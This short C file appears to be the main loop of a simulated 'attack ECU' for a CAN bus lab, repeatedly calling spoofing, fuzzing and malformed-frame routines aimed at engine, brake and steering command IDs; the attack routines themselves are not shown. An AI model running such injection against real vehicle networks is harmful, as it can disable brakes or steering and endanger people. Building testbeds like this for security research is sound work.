#include <stdio.h>
#include <stdint.h>

#include "network.h"
#include "bus.h"
#include "util.h"

//#include "attack_spoof.h"
//#include "attack_fuzz.h"
//#include "attack_malformed.h"
//#include "attack_replay.h"

#include "can.h"   // your CAN ID definitions

#include "attacks/attack_spoof.h"
#include "attacks/attack_fuzz.h"
#include "attacks/attack_malformed.h"

int main(void)
{
    if (network_init() < 0) {
        printf("[ATTACKER] Network init failed, exiting\n");
        return 1;
    }

    bus_init();   // your new bus_init() just prints and returns 0

    printf("[ATTACKER] Starting attack ECU\n");

    while (1) {
        attack_spoof_send(CAN_ID_ENGINE, (uint8_t*)"AAAA", 4);
        attack_fuzz_random(CAN_ID_BRAKE_CMD);
        attack_send_malformed(CAN_ID_STEER_CMD);
        util_sleep_ms(500);
    }

    return 0;
}
